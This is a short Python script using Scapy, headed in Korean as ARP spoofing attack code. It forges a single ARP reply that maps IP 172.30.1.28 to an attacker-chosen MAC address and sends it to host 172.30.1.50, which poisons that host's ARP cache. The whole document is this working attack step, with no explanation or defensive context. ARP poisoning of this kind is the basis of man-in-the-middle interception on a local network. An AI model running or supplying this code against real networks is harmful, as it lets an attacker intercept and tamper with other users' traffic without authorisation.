# ARP SPOOFING 공격 코드

from scapy.all import *
from scapy.layers.l2 import ARP

arp = ARP(op=2, psrc = '172.30.1.28' , pdst = '172.30.1.50', hwsrc = 'C8:F7:33:51:FB:53', hwdst = 'F8:63:3F:62:6D:80')
send(arp)
